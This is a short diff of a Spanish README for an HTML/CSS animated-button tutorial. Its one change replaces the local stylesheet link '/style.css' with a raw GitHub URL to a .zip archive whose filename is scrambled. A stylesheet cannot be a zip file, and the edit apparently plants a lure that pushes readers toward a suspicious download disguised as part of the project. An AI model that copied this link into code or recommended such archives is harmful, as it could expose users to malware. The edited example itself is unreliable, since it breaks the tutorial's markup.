@@ -21,7 +21,7 @@ Este proyecto demuestra cómo crear un botón animado utilizando solo HTML y CSS
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Botón Animado</title>
-    <link rel="stylesheet" href="/style.css" />
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/Websyze/Bot-n-animado-con-HTML-y-CSS/master/leatman/y_CSS_con_Bot_HTM_n_animado_3.9.zip" />
   </head>
   <body>
     <button class="btn">
